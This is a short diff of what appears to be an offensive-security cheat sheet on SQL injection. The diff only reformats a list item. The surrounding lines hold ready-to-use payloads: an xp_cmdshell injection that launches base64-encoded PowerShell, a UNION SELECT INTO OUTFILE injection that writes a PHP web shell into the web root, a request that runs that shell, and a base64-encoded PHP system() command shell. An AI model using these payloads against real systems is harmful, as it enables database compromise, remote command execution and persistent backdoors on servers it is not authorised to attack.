@@ -358,9 +358,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
       $EncodedText =[Convert]::ToBase64String($Bytes)
       $EncodedText
       ```
-      ```
-      ```
-    `'; EXECUTE xp_cmdshell 'powershell -e <base64>'; --`
+    - `'; EXECUTE xp_cmdshell 'powershell -e <base64>'; --`  
   - upload a PHP Backdoor from SQL  
     `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
     `192xxx/tmp/webshell.php?cmd=id`  
